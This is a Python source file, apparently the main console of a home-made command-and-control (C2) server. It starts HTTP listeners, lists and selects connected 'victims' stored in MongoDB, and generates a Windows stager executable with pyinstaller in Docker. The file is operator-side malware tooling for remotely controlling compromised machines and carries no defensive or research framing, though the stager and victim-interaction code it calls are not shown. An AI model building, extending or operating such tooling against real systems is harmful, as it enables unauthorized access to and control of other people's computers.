from lib.listener import Listener
from lib.database import Database
from lib.task import Task
from lib.victim import Victim
import pdb
import pymongo
import re
import os
import shutil
import subprocess
import argparse
from lib.logger import Logger
from termcolor import colored
import datetime
import pathlib

## Provides command history like bash to input
import readline

def parser():
	parser = argparse.ArgumentParser(description='Python based C2')
	
	parser.add_argument('-g', '--generate', help = 'Generates exe', action='store_true')
	parser.add_argument('-v', '--verbose', help = 'Generates exe', action='store_true')
	args = parser.parse_args()
	return args


def display_main_help_menu():
	print(' --------------------------------------')
	print('|          SERVER HELP MENU            |')
	print(' --------------------------------------')
	commands = {'http':'Starts a new http listener.' , 'jobs': 'List existing http listener running.', 'kill': 'Kill the http listener running', 'generate': 'generates the stager in exe format in ./tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}

	for command in commands.keys():
		print(colored(command,'cyan') + " - " + commands[command])

def generate_stager():
	## Convert to exe and save
	if os.path.exists('./tmp'):
		shutil.rmtree('./tmp')

	os.mkdir('./tmp')
	subprocess.call('cp stager.spec tmp',shell=True)
	subprocess.call('cp requirements.txt tmp',shell=True)
	subprocess.call('cp stager.py tmp',shell=True)
	subprocess.call('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows', cwd=r"./tmp",shell=True)


def main(args,db_object,server_logger):
	myclient = db_object.mongoclient

	if args.generate:
		## Import stager code and convert to exe
		generate_stager()

	display_main_help_menu()
	print()

	while True:
		print(colored("Enter server commands",'blue'))
		cmd = str(input())

		if cmd == 'http':
			h = Listener(port="8080")
			
			h.start_listener()
			server_logger.info_log("Started http listener.",'green')

		elif cmd == 'listeners':
			Listener.show_listeners()

		elif cmd == 'kill_listeners':
			Listener.kill_all_listeners()


		elif cmd == 'generate':
			generate_stager()
			print("exe dumped to ./tmp")

		elif cmd == 'victims':
			## Load victims from db everytime and instatiate objects. TODO - any effcient approach?
			Victim.load_victims_from_db()
			Victim.show_victims()

		## Matching use LKF0599NMU
		elif re.match(r'^use [\w\d]{1,10}$',cmd):

			Victim.load_victims_from_db()
			victim_id = re.findall(r'^use ([\w\d]{1,10})$',cmd)[0]

			## Supporting Regex to quickly interact with part of ID.
			r = re.compile(victim_id+".*")
			matched = list(filter(r.match, Victim.victims.keys()))

			if len(matched) == 0 :
				server_logger.info_log("No victims found with that ID",'yellow')
			elif len(matched) == 1 :
				victim_id = matched[0]
				server_logger.info_log(f"Interacting with {victim_id}",'green')
				Victim.victims[victim_id].victim_menu()
			else:
				server_logger.info_log("Multiple victims found, Please provide full or unique ID.",'yellow')


		elif cmd == 'help':
			display_main_help_menu()

		elif cmd == 'exit':
			Listener.kill_all_listeners()
			db_object.drop_db()
			break

		print()



if __name__=="__main__":
	args = parser()
	db_url = "mongodb://localhost:27017/"

	## Setting up logging
	server_logger = Logger(logdir='logs',logfile='logs',verbose=args.verbose )
	server_logger.setup()

	## launches the log in new screen
	server_logger.launch_logs_screen()
	

	server_logger.info_log(f"Initiated database connection from main- {db_url}",'green')

	db_object = Database(url=db_url)
	Listener.mongoclient = db_object.mongoclient
	Victim.mongoclient = db_object.mongoclient
	Task.mongoclient = db_object.mongoclient

	try:
		main(args,db_object,server_logger)
	except KeyboardInterrupt:
		Listener.kill_all_listeners()
		db_object.drop_db()